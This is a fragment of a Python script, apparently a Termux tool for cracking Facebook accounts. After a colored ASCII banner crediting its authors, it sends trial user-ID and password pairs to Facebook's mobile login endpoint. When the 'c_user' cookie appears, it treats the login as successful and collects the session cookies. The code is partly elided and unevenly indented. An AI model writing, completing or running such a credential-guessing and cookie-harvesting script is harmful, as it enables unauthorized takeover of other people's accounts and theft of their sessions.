...
\033[1;31m.  _______                      _      
\033[1;32m. |__   __|                    | |     
\033[1;33m.    | | __ _ _   _ _   _  __ _| |__   
\033[1;34m.    | |/ _` | | | | | | |/ _` | '_ \  
\033[1;35m.    | | (_| | |_| | |_| | (_| | |_) | 
\033[1;36m.    |_|\__,_|\__, |\__, |\__,_|_.__/  
\033[1;37m.              __/ | __/ |             
\033[1;38m.             |___/ |___/              


[+]==============================================
[+] CREATED BY   :  tayyab x awara
[+] FB GROUP     :  TERMUX TEAM INP COMMAND 
[+] ON GITHUB    :  Awaraladkya
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.2
[+]=============================================="""
...
def d(uid,pwx,tl):
	...
	try:
      ...
      'viewport-width': '980',}
			lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100_aimp;',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
